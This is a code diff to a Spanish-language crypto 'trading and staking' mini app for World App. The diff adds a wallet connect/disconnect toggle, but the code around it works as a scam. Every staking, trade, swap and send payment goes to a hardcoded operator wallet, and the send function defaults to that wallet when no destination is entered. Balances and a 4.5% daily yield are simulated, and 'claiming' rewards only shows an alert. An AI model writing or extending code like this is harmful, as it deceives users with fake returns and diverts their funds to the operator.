@@ -15,16 +15,16 @@
 <body class="p-4 max-w-md mx-auto min-h-screen flex flex-col justify-between">
 
     <div>
-        <!-- Header con Identidad World Chain -->
+        <!-- Header con Toggle Conectar/Desconectar -->
         <div class="flex items-center justify-between bg-gray-900 p-3 rounded-xl border border-gray-800 mb-4">
             <div class="flex items-center space-x-3">
                 <div class="w-10 h-10 bg-yellow-500 rounded-full flex items-center justify-center font-bold text-black text-xl">U</div>
                 <div>
                     <h1 class="font-bold text-sm">Uno Trading & Staking</h1>
-                    <p id="user-status" class="text-xs text-gray-400">Sin conectar (World Chain)</p>
+                    <p id="user-status" class="text-xs text-gray-400">Sin conectar</p>
                 </div>
             </div>
-            <button id="connect-btn" onclick="connectWallet()" class="bg-yellow-500 hover:bg-yellow-400 text-black px-3 py-1.5 rounded-lg text-xs font-bold">Conectar</button>
+            <button id="connect-btn" onclick="toggleWallet()" class="bg-yellow-500 hover:bg-yellow-400 text-black px-3 py-1.5 rounded-lg text-xs font-bold">Conectar</button>
         </div>
 
         <!-- TAB 1: INICIO -->
@@ -209,7 +209,7 @@
                 </div>
             </div>
 
-            <!-- Panel de Inversión Staking en World Chain -->
+            <!-- Panel de Inversión Staking -->
             <div class="bg-gray-900 p-4 rounded-xl border border-gray-800 space-y-3">
                 <h3 class="font-bold text-sm">🥩 Depositar Staking en World Chain</h3>
                 <div>
@@ -250,10 +250,10 @@
         const MY_WALLET_ADDRESS = "0x019001d46cd3155ef045a41f4c359c040595438c";
         const APP_ID = "app_91fc57acb47e001429f888794210c9f6";
         
+        let isConnected = false;
         let currentPrice = 1.0000;
         let chartData = Array(15).fill(1.0000);
         
-        // Variables de Staking en World Chain (4.5% diario)
         let stakedBalance = 45.576;
         let dailyRate = 0.045; 
         let totalMiningIncome = 0.091;
@@ -290,7 +290,6 @@
         }
         setInterval(updateChart, 1000);
 
-        // Actualización de ganancias en vivo en World Chain
         function updateMiningUI() {
             const dailyEst = stakedBalance * dailyRate;
             todayIncome += (dailyEst / 86400); 
@@ -303,8 +302,19 @@
         }
         setInterval(updateMiningUI, 1000);
 
-        // Autenticación con World App Wallet
-        async function connectWallet() {
+        // Control dinámico de Conexión / Desconexión
+        async function toggleWallet() {
+            if (isConnected) {
+                // Desconectar la cartera
+                isConnected = false;
+                document.getElementById('user-status').innerText = "Sin conectar";
+                const btn = document.getElementById('connect-btn');
+                btn.innerText = "Conectar";
+                btn.className = "bg-yellow-500 hover:bg-yellow-400 text-black px-3 py-1.5 rounded-lg text-xs font-bold";
+                return;
+            }
+
+            // Conectar la cartera mediante MiniKit
             if (!window.MiniKit || !MiniKit.isInstalled()) {
                 setConnectedState("0x0190...438c");
                 return;
@@ -331,18 +341,20 @@
         }
 
         function setConnectedState(address) {
+            isConnected = true;
             const shortAddr = address.substring(0, 6) + "..." + address.slice(-4);
             document.getElementById('user-status').innerText = shortAddr + " • World Chain";
             const btn = document.getElementById('connect-btn');
             if (btn) {
-                btn.innerText = "Conectado";
-                btn.className = "bg-green-600 text-white px-3 py-1.5 rounded-lg text-xs font-bold";
+                btn.innerText = "Desconectar";
+                btn.className = "bg-red-600 hover:bg-red-500 text-white px-3 py-1.5 rounded-lg text-xs font-bold";
             }
         }
 
         async function executeRealStaking() {
+            if (!isConnected) return alert("Por favor conecta tu billetera primero.");
             const amount = parseFloat(document.getElementById('stake-input').value) || 0;
-            if (!window.MiniKit || !MiniKit.isInstalled()) return alert("Abre esta Mini App dentro de World App.");
+            if (!window.MiniKit || !MiniKit.isInstalled()) return alert("Abre dentro de World App.");
 
             try {
                 const res = await MiniKit.commandsAsync.pay({
@@ -353,7 +365,7 @@
                 });
                 if (res.finalPayload && res.finalPayload.status === "success") {
                     stakedBalance += amount;
-                    alert("¡Staking exitoso en World Chain! Ganando 4.5% diario.");
+                    alert("¡Staking exitoso en World Chain!");
                 }
             } catch (err) {
                 alert("Error: " + err.message);
@@ -361,11 +373,13 @@
         }
 
         function claimMiningRewards() {
-            alert(`¡Reclamados $${todayIncome.toFixed(4)} USDC de Staking en World Chain!`);
+            if (!isConnected) return alert("Por favor conecta tu billetera primero.");
+            alert(`¡Reclamados $${todayIncome.toFixed(4)} USDC de Staking!`);
             todayIncome = 0;
         }
 
         async function executeRealTrade(direction) {
+            if (!isConnected) return alert("Por favor conecta tu billetera primero.");
             const amount = document.getElementById('trade-amount').value;
             const tokenSymbol = document.getElementById('trade-token').value;
             if (!window.MiniKit || !MiniKit.isInstalled()) return alert("Abre dentro de World App.");
@@ -374,10 +388,10 @@
                     reference: "trade-" + Date.now(),
                     to: MY_WALLET_ADDRESS,
                     tokens: [{ symbol: tokenSymbol, token_amount: (parseFloat(amount) * 1e18).toString() }],
-                    description: `Operación ${direction} Uno Trading (World Chain)`
+                    description: `Operación ${direction} Uno Trading`
                 });
                 if (res.finalPayload && res.finalPayload.status === "success") {
-                    alert(`¡Transacción confirmada en World Chain! Hash: ${res.finalPayload.transaction_id}`);
+                    alert(`¡Transacción confirmada! Hash: ${res.finalPayload.transaction_id}`);
                 }
             } catch (err) {
                 alert("Error: " + err.message);
@@ -385,6 +399,7 @@
         }
 
         async function executeRealSwap() {
+            if (!isConnected) return alert("Por favor conecta tu billetera primero.");
             const amount = document.getElementById('swap-amount').value;
             if (!window.MiniKit || !MiniKit.isInstalled()) return alert("Abre dentro de World App.");
             const res = await MiniKit.commandsAsync.pay({
@@ -397,6 +412,7 @@
         }
 
         async function executeRealSend() {
+            if (!isConnected) return alert("Por favor conecta tu billetera primero.");
             const dest = document.getElementById('send-dest').value || MY_WALLET_ADDRESS;
             const amount = document.getElementById('send-amount').value;
             if (!window.MiniKit || !MiniKit.isInstalled()) return alert("Abre dentro de World App.");
